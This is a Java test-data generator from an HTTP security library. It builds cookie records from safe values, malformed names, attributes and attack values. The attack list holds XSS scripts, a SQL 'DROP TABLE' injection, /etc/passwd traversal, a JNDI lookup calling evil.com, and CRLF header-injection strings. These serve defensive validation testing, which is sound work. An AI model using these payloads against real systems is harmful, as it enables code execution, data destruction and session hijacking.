/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.Cookie;

/**
 * Generates Cookie records for testing purposes.
 * Implements: Task G8 from HTTP verification specification
 */
public class CookieGenerator implements TypedGenerator<Cookie> {

    private static final TypedGenerator<String> COOKIE_NAMES = Generators.fixedValues(
            "JSESSIONID",
            "session_id",
            "auth_token",
            "csrf_token",
            "user_id",
            "preferences",
            "language",
            "theme",
            "cart_id",
            "tracking_id",
            "remember_me",
            "login_token",
            "access_token",
            "refresh_token",
            "device_id"
    );

    private static final TypedGenerator<String> SAFE_VALUES = Generators.fixedValues(
            "ABC123DEF456",
            "session_12345",
            "user_67890",
            "true",
            "false",
            "en_US",
            "dark",
            "light",
            "cart_abc123",
            "track_xyz789",
            "remember_yes",
            "token_valid",
            "device_mobile",
            "lang_de",
            "theme_blue"
    );

    private static final TypedGenerator<String> ATTACK_VALUES = Generators.fixedValues(
            "<script>alert('xss')</script>",
            "'; DROP TABLE sessions; --",
            "../../../etc/passwd",
            "\u0000null_byte",
            "${jndi:ldap://evil.com/}",
            "javascript:alert(1)",
            "\r\nSet-Cookie: injected=value",
            "\r\n\r\nHTTP/1.1 200 OK",
            "%0d%0aSet-Cookie: evil=bad",
            "A".repeat(6000),  // Very long value > 5000 characters
            "\u202e\u202d",     // Unicode direction override
            "\t\r\n injected",  // Control characters
            "admin'; --",       // SQL injection
            "../admin/config",  // Path traversal
            "data:text/html,<script>alert(1)</script>"
    );

    private static final TypedGenerator<String> SPECIAL_NAMES = Generators.fixedValues(
            "",                         // Empty name
            "   ",                     // Whitespace name
            "cookie with spaces",      // Spaces in name
            "cookie=equals",          // Equals in name
            "cookie;semicolon",       // Semicolon in name
            "cookie,comma",           // Comma in name
            "cookie\"quote",          // Quote in name
            "cookie\ttab",            // Tab in name
            "cookie\nnewline",        // Newline in name
            "cookie[bracket]",        // Brackets in name
            "cookie{brace}",          // Braces in name
            "cookie|pipe",            // Pipe in name
            "cookie\\backslash",      // Backslash in name
            "very_long_cookie_name_" + "A".repeat(150) // Very long name > 100 characters
    );

    private static final TypedGenerator<String> ATTRIBUTES = Generators.fixedValues(
            "",                                          // No attributes
            "Domain=example.com",                       // Domain only
            "Path=/admin",                              // Path only
            "Secure",                                   // Secure only
            "HttpOnly",                                 // HttpOnly only
            "SameSite=Strict",                         // SameSite only
            "Max-Age=3600",                            // Max-Age only
            "Domain=example.com; Path=/; Secure",      // Multiple safe attributes
            "Domain=example.com; Path=/; HttpOnly; SameSite=Lax", // Full safe attributes
            "Domain=.evil.com",                        // Malicious domain
            "Path=../../../",                          // Path traversal in attributes
            "Max-Age=-1",                             // Negative Max-Age
            "Domain=; Path=",                         // Empty attribute values
            "Invalid=Attribute; Bad=Value",           // Invalid attributes
            "Domain=example.com\r\nSet-Cookie: evil=bad", // Header injection
            "Path=/\u0000/admin"                      // Null byte in path
    );

    private final TypedGenerator<Integer> typeGen = Generators.integers(0, 3);

    @Override
    public Cookie next() {
        int type = typeGen.next();

        return switch (type) {
            case 0 -> new Cookie(COOKIE_NAMES.next(), SAFE_VALUES.next(), ATTRIBUTES.next());
            case 1 -> new Cookie(COOKIE_NAMES.next(), ATTACK_VALUES.next(), ATTRIBUTES.next());
            case 2 -> new Cookie(SPECIAL_NAMES.next(), SAFE_VALUES.next(), ATTRIBUTES.next());
            default -> new Cookie(SPECIAL_NAMES.next(), ATTACK_VALUES.next(), ATTRIBUTES.next());
        };
    }

    @Override
    public Class<Cookie> getType() {
        return Cookie.class;
    }
}